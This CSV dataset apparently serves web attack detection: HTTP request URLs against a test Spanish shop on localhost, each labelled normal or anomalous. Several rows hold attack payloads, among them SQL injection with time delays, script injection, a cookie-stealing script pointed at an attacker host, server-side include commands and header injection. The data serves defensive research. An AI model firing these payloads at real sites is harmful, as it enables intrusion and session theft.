URL,Target
http://localhost:8080/tienda1/publico/vaciar.jsp ,1
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/publico/pagar.jsp ,0
http://localhost:8080/tienda1/publico/miembros.jsp ,0
http://localhost:8080/tienda1/publico/carrito.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp ,1
http://localhost:8080/tienda1/imagenes/cmenbul.gif ,0
http://localhost:8080/tienda1/publico/registro.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/miembros/fotos.jsp ,0
http://localhost:8080/tienda1/miembros/index.jsp ,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=85&cantidad=76&B1=A%F1adir+al+carrito ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=neile&pwd=b7lg685&remember=on%2F&B1=Entrar ,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito ,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=melonie&password=ad1168n77&nombre=Dulio&apellidos=Ubach+Rodr%EDguez&email=wilmot%40schnaps.com.ne&dni=87584326G&direccion=C%2F+Lara%2C+162+&ciudad=Villanueva+de+Campe%E1n&cp=01423&provincia=Barcelona%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&ntc=5124736256894307&B1=Registrar ,1
http://localhost:8080/tienda1/miembros/salir.jsp ,0
http://localhost:8080/tienda1/imagenes/1.gif/.java ,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2373&B1=Confirmar%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- ,1
http://localhost:8080/tienda1/miembros/index.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=mombourq&password=decusada&nombre=Edurne&apellidos=Charbonnier+Sisneros&emailA=bervil-berkel%40boda-barata.sn&dni=31182783G&direccion=Escritora+Luciana+Narvaez+67+10%3FA&ciudad=Albox&cp=44620&provincia=Le%F3n&ntc=6075270665324595&B1=Registrar ,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,0
http://localhost:8080/tienda1/publico/anadir.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp ,1
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/imagenes/2.gif ,0
http://localhost:8080/tienda1/publico/vaciar.jsp ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 ,0
http://localhost:8080/tienda1/publico/registro.jsp ,0
http://localhost:8080/tienda1/6909030637832563290.jsp.Bak ,1
http://localhost:8080/tienda1/miembros/salir.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7896&B1=Confirmar%2F ,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas ,1
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- ,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&loginA=gamaleld&password=t54p-4l&nombre=Shunko&apellidos=Volta+Piriz&email=guarneros%40elfisioencasa.eu&dni=78789686N&direccion=Menorca+13%2C+2%3FH&ciudad=Villagonzalo&cp=31495&provincia=Granada&ntc=4253253341921904&B1=Registrar ,1
http://localhost:8080/tienda1/publico/miembros.jsp ,0
http://localhost:8080/iissamples/ExAir/FunNGames/FunNGames.asp ,1
http://localhost:8080/tienda1/publico/miembros.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=an-son&pwd=4up493a562i5&remember=on%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=Entrar ,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito ,1
http://localhost:8080/tienda1/publico/vaciar.jsp ,0
http://localhost:8080/tienda1/index.jsp ,0
http://localhost:8080/tienda1/publico/carrito.jsp ,0
http://localhost:8080/tienda1/miembros/fotos.jsp ,0
http://localhost:8080/tienda1/global/titulo.jsp ,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg ,0
http://localhost:8080/tienda1/imagenes/2.gif ,0
http://localhost:8080/tienda1/publico/anadir.jsp ,0
http://localhost:8080/tienda1/imagenes/2.gif ,0
http://localhost:8080/tienda1/miembros/salir.jsp ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,1
http://localhost:8080/tienda1/publico/carrito.jsp ,0
http://localhost:8080/tienda1/imagenes/1.gif ,0
http://localhost:8080/tienda1/miembros/salir.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp/.OLD ,1
http://localhost:8080/tienda1/global/creditos.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp ,1
http://localhost:8080/tienda1/publico/anadir.jsp ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=jozef&password=ve9dErse&nombre=Tahiel&apellidos=Gua%2Bsp%2B+Kiu%2Bhan&email=lemontier%40viajesnacionales.kp&dni=70721027Y&direccion=Calle+Virgen+De+La+Hoz%2C+123+4-B&ciudad=Borrass%E0&cp=44564&provincia=Zaragoza&ntc=7002955624204925&B1=Registrar ,1
http://localhost:8080/tienda1/miembros/editar.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp ,0
http://localhost:8080/tienda1/publico/carrito.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7766&B1=Confirmar ,0
http://localhost:8080/tienda1/imagenes/1.gif ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=alain&password=-57s5g03&nombre=Sigrid&apellidos=Aranzadi+Henkel&email=cliff5%40fichajes.nom.ms&dni=61093505P&direccion=Mo%F1as+S%2FN%2C+&ciudad=Sax&cp=22255&provincia=Madrid&ntc=1364126817729617&B1=+ ,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=alyssa&pwd=ventr%F3n&rememberA=on&B1=Entrar ,1
http://localhost:8080/tienda1/global/titulo.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,0
http://localhost:8080/tienda1/miembros/salir.jsp ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,1
http://localhost:8080/tienda1/miembros/editar.jsp ,0
http://localhost:8080/tienda1/publico/miembros.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Ques%2Bo+Manchego&precio=39&cantidad=66&B1=A%F1adir+al+carrito ,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2793&B1=Pasar+por+caja ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,0
http://localhost:8080/tienda1/miembros/salir.jsp ,0
http://localhost:8080/tienda1/publico/miembros.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp ,1
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/imagenes/4861362529278789730 ,1
http://localhost:8080/tienda1/asf-logo-wide.gif ,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1103&B1=Pasar+por+caja ,0
http://localhost:8080/tienda1/imagenes/logo.gif ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8744&B1=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org ,1
http://localhost:8080/tienda1/imagenes/2.gif ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=roze&password=L1Am217r5&nombre=Iolav&apellidos=Vallabri+Visglerio&email=hallaran%40manjarr.cd&dni=76371566C&direccion=Pl.+San+Marcos%2C+0%2C+11F&ciudad=Orejana&cp=22809&provincia=Segovia&ntc=5956391095896498&B1=Registrar ,0
http://localhost:8080/tienda1~ ,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=pato&password=salamandrino&nombre=Virgilia&apellidos=Escuder+Liveris&email=overman%40saavedradiaz.travel&dni=42101588L&direccion=Rio+Alzania%2C+72%2C+6G&ciudad=Elche%2FElx&cp=40234&provincia=Valencia&ntc=5155735586136937&B1=Registrar ,0
http://localhost:8080/tienda1/publico/anadir.jsp ,0
http://localhost:8080/tienda1/miembros/fotos.jsp ,0
http://localhost:8080/tienda1/global/4861362529278789730 ,1
http://localhost:8080/tienda1/global/titulo.jsp ,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg ,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg ,0
http://localhost:8080/tienda1/imagenes/logo.gif ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp ,1
http://localhost:8080/tienda1/global/titulo.jsp ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/publico/productos.jsp/4861362529278789730.OLD ,1
http://localhost:8080/tienda1/publico/anadir.jsp ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2%257C ,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modoA=entrar&login=roddie9&pwd=2esu1ador3&remember=on&B1=Entrar ,1
http://localhost:8080/tienda1/global/creditos.jsp ,0
http://localhost:8080/tienda1/miembros/index.jsp ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,0
http://localhost:8080/scripts/tools/drvrs.exe ,1
http://localhost:8080/tienda1/imagenes/1.gif/asf-logo-wide.gif/ ,1
http://localhost:8080/tienda1/publico/autenticar.jsp ,0
http://localhost:8080/tienda1/publico/productos.jsp ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/miembros/fotos.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,0
http://localhost:8080/tienda1/index.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=duan&pwd=00nd11e%F10&remember=off&B1=Entrar ,0
http://localhost:8080/tienda1/publico/registro.jsp ,1
http://localhost:8080/tienda1/publico/pagar.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=chern1&pwdA=70staje&remember=off&B1=Entrar ,1
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/publico/autenticar.jsp ,0
http://localhost:8080/tienda1/global/menum.jsp ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=winsberg&password=flagicio&nombre=Lihuel&apellidos=Novell+Abenoza&email=hasserman%40clinicadentalsansalvador.ua&dni=95659491F&direccion=*Vila-nova%2C+139+&ciudad=Riudoms&cp=36960&provincia=Burgos&ntc=1343774789684603&B1=Registrar ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp.Old ,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg ,0
http://localhost:8080/ws-client/loanCalculation.jsp ,1
http://localhost:8080/tienda1/publico/miembros.jsp ,0
http://localhost:8080/tienda1/imagenes/2.gif ,0
http://localhost:8080/tienda1/index.jsp ,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas ,0
http://localhost:8080/tienda1/global/estilos.css ,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg ,0
http://localhost:8080/tienda1/miembros/editar.jsp/.old ,1
http://localhost:8080/tienda1/imagenes/cmenbul.gif ,0
http://localhost:8080/tienda1/global/creditos.jsp/asf-logo-wide.gif.OLD ,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=100AND+1%3D1&cantidad=58&B1=A%F1adir+al+carrito ,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg ,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=nada&password=BiZanTinA&nombre=Segundo&apellidos=De+la+Cerda+Gassol&email=gonska%40estaestuweb.com.af&dni=36746323M&direccion=Rio+Esgueva+57+1%3FG&ciudad=Urdu%F1a-Ordu%F1a&cp=43364&provincia=Albacete&ntc=1222164542017972&B1=Registrar ,0
http://localhost:8080/tienda1/miembros/fotos.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=carry&password=rut1&nombre=Mart%EDn&apellidos=Francile+Jalmar&email=berky_tengroth%40interanuncios.ag&dni=22299277H&direccion=C%2F+Jesus+Nazareno%2C+163%2C+&ciudad=Almaja%3Fno&cp=44110&provincia=Burgos&ntc=3058593782727752&B1=Registrar ,1
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=3any%250ASet-cookie%253A%2BTamper%253D1041264011025374727&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=30&B1=A%F1adir+al+carrito ,1
http://localhost:8080/tienda1/asf-logo-wide.gif.bak ,1
http://localhost:8080/tienda1/global/menum.jsp.old ,1
http://localhost:8080/tienda1/miembros/index.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito ,0
http://localhost:8080/tienda1/publico/registro.jsp ,0
http://localhost:8080/tienda1/miembros/editar.jsp?modoA=registro&login=bernarr&password=gordana&nombre=Uriel&apellidos=Cloquell+Pesarrodona&email=moorehead-hamlett%40touringa.pw&dni=64688843D&direccion=Pl.+La+Merced%2C+107+4C&ciudad=Cuarte+de+Huerva&cp=19420&provincia=Teruel&ntc=4593991243170323&B1=Registrar ,1
http://localhost:8080/tienda1/publico/pagar.jsp ,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=39&cantidad=3&B1=A%F1adir+al+carrito ,0
http://localhost:8080/tienda1/miembros/salir.jsp/asf-logo-wide.gif/.Old ,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=babatund&password=pA6OMer9-A&nombre=Juana+del+Pilar&apellidos=Luna+Barberan&email=mazurowna%40wdsl.om&dni=19546963E&direccion=Villadangos+Del+Paramo%2C+82%2C+&ciudad=Encinas+de+Esgueva&cp=10830&provincia=Barce%2Blon%3F%2Fa&ntc=5365738910346806&B1=Registrar ,1
http://localhost:8080/tienda1/global/creditos.jsp.OLD ,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=liping%4040&password=paletada&nombre=Laura&apellidos=Esparraguera&email=palk%40interpretacion-diccionario-y-significado-de-los-sue%F1os.com.&dni=31539666L&direccion=Calle+Gonzalo+De+Berceo+76%2C+&ciudad=Rioseco+de+Soria&cp=16890&provincia=Salamanca&ntc=5041701632668504&B1=Registrar ,1
http://localhost:8080/tienda1/publico/anadir.jsp ,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=28&B1=A%F1adir+al+carrito ,0
http://localhost:8080/tienda1/publico/registro.jsp ,0
http://localhost:8080/tienda1/asf-logo-wide.gif/ ,1
http://localhost:8080/tienda1/global/estilos.css ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=haiping&pwd=promanar&remember=on&B1=Entrar ,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg ,0
http://localhost:8080/tienda1/publico/carrito.jsp ,0
http://localhost:8080/tienda1/global/titulo.jsp ,0
http://localhost:8080/tienda1/imagenes/3.gif ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,1
http://localhost:8080/tienda1/publico/asf-logo-wide.gif.java ,1
http://localhost:8080/tienda1/publico/vaciar.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=denoon&password=primate&nombre=Enoc&apellidos=Ayj%F3n+Urmente&email=ehlers%40citiway.io&dni=39148879G&direccion=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F&ciudad=Castellvell+del+Camp&cp=45621&provincia=Cuenca&ntc=5404280491396556&B1=Registrar ,1
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg ,0
http://localhost:8080/tienda1/publico/carrito.jsp ,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas ,0
http://localhost:8080/tienda1/index.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/publico/registro.jsp ,1
http://localhost:8080/tienda1/imagenes/2.gif ,0
http://localhost:8080/tienda1/global/estilos.css ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/miembros/salir.jsp ,0
http://localhost:8080/tienda1/publico/asf-logo-wide.gif/ ,1
http://localhost:8080/tienda1/asf-logo-wide.gif/.Old ,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8588&B1=Confirmar%2F ,1
http://localhost:8080/tienda1/imagenes/3.gif ,0
http://localhost:8080/6909030637832563290.jsp.OLD ,1
http://localhost:8080/tienda1/miembros/fotos.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&pwd=6r6s1arr%E17&remember=on&B1=Entrar ,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6276%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C&B1=Confirmar ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,1
http://localhost:8080/tienda1/publico/registro.jsp ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,1
http://localhost:8080/tienda1/miembros/fotos.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp ,1
http://localhost:8080/tienda1/miembros/editar.jsp ,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas ,0
http://localhost:8080/tienda1/global/creditos.jsp ,0
http://localhost:8080/CFIDE/administrator/index.cfm ,1
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg ,0
http://localhost:8080/tienda1/imagenes/3.gif ,0
http://localhost:8080/tienda1/publico/anadir.jsp ,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=2%2F&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=21&B1=A%F1adir+al+carrito ,1
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito ,0
http://localhost:8080/tienda1/publico/anadir.jsp ,0
http://localhost:8080/tienda1/publico/carrito.jsp ,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=paton&password=caF12n&nombre=Raimulfo&apellidos=Masclans+Nieto&email=faro%40vilano.pf&dni=72219452G&direccion=Pl.+Juan+De+Antxieta%2C+191%2C+13%3FG&ciudad=Simat+de+la+Valldigna&cp=20001&provincia=Lugo&ntc=6441854276984473&B1=Registrar ,0
http://localhost:8080/tienda1/publico/carrito.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/index.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235 ,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%4040 ,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=85&cantidad=1&B1=A%F1adir+al+carrito ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=%253F&precio=7094&B1=Confirmar ,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=hannula&password=6NcOrV%24ar&nombre=Ennio&apellidos=Pries+Ludue%F1a&email=ecoffery%40cpanelweb.com.tf&dni=83982858Z&direccion=Urbanizacion+Soto+De+La+Moraleja+117+&ciudad=%DArbel+del+Castillo&cp=17473&provinciaA=C%E1ceres&ntc=6207346921291925&B1=Registrar ,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=moel&password=lab2a8o4i0&nombre=Evangelino&apellidos=Marcano+Giner&email=jochim%40ajuntamentdebarcelona2-0.qa&dni=68733218H&direccion=Calle+Orotava+31+&ciudad=Valdelinares&cp=43439&provincia=Burgos&ntc=8288603955421514&B1=Registrar ,0
http://localhost:8080/tienda1/publico/productos.jsp ,0
http://localhost:8080/tienda1/miembros/index.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=krug&pwd=mi5-a&remember=off&B1=Entrar ,0
http://localhost:8080/tienda1/publico/miembros.jsp ,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas ,0
http://localhost:8080/tienda1/miembros/salir.jsp ,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- ,1
http://localhost:8080/tienda1/publico/entrar.jsp ,0
http://localhost:8080.INC ,1
http://localhost:8080/tienda1/publico/productos.jsp ,0
http://localhost:8080/webapp/examples/HelloPervasive ,1
http://localhost:8080/tienda1/publico/productos.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp ,0
http://localhost:8080/tienda1/publico/anadir.jsp ,1
http://localhost:8080/tienda1/imagenes/logo.gif ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=harianto&password=provicero&nombre=Sans%F3n&apellidos=Obrador+Scolari&email=putikiat%40tobarisch.mh&dni=40813041R&direccion=Riera+De+Sant+Andreu%2C+S%2FN%2C+&ciudadA=Arroyomolinos+de+Le%F3n&cp=16195&provincia=Huesca&ntc=6785859877248336&B1=Registrar ,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=rodrique&pwd=gu%27ad%27a%27l&remember=on&B1=Entrar ,1
http://localhost:8080/tienda1/publico/registro.jsp ,1
http://localhost:8080/tienda1/publico/registro.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=helem&password=aPAreCEr&nombre=Pancho&apellidos=Goldaratz+Brizuela&email=lahbib_hodo%40silver-knights.ie&dni=54489862X&direccion=Berlin+116+&ciudad=Sudanell&cp=24346&provincia=Burgos&ntc=011349048658532&B1=Registrar ,1
http://localhost:8080/tienda1/index.jsp ,0
http://localhost:8080/tienda1/index.jsp ,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg ,0
http://localhost:8080/tienda1/miembros/salir.jsp ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,0
http://localhost:8080/tienda1/publico/carrito.jsp ,0
http://localhost:8080/tienda1/imagenes/1.gif ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/publico/anadir.jsp ,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas ,0
http://localhost:8080/tienda1/publico/registro.jsp ,1
http://localhost:8080/tienda1/publico/carrito.jsp ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito ,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas ,1
http://localhost:8080/tienda1/publico/anadir.jsp ,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=dadang&pwd=mo%2Fn2ep%2F%EDo&remember=on&B1=Entrar ,1
http://localhost:8080/tienda1/publico/anadir.jsp ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,1
http://localhost:8080/tienda1/publico/anadir.jsp ,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombreA=Queso+Manchego&precio=85&cantidad=84&B1=A%F1adir+al+carrito ,1
http://localhost:8080/tienda1/publico/pagar.jsp ,0
http://localhost:8080/tienda1/imagenes/3.gif ,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&password=contrAamura&nombre=Nicasia&apellidos=Coyoma+Abia&email=padovani%40thequeenworm.mp&dni=78419891B&direccion=Avenida+Castilla-la+Mancha+187%2C+3-D&ciudad=Sagrada%2C+La&cp=09318&provincia=A+Coru%F1a&ntc=4808153993761167&B1=Registrar ,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg ,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=tonie&password=fu43on2r&nombre=Ravi&apellidos=Mascarell+Yomona&email=payson_hoven%40quecole.za&dni=05111871Y&direccion=C%2F+Conde+Oliveto+S%2FN%2C+&ciudad=Taradell&cp=19247&provincia=%C1vila&ntc=7846969771020065&B1A=Registrar ,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E&cantidad=0&B1=A%F1adir+al+carrito ,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp ,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=67&B1=A%F1adir+al+carrito ,0
http://localhost:8080/tienda1/publico/anadir.jsp ,0
http://localhost:8080/tienda1/imagenes/asf-logo-wide.gif/~ ,1
http://localhost:8080/tienda1/asf-logo-wide.gif/ ,1
http://localhost:8080/tienda1/publico/vaciar.jsp ,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5632&B1=Confirmar ,0
http://localhost:8080/iisadmpwd/aexp.htr ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 ,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito ,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=gargulak&password=Bu7c2Pi%E9&nombre=Deysi&apellidos=Benapr%E9s+Vaqu%E9&email=ontiveros%40masqueclases.th&dni=50422961S&direccion=C%2Fjon+Pe%F1uelas%2C+117%2C+&ciudad=Quintanas+de+Gormaz&cp=38435&provincia=Valencia&ntc=9947210285103354&B1=Registrar ,0
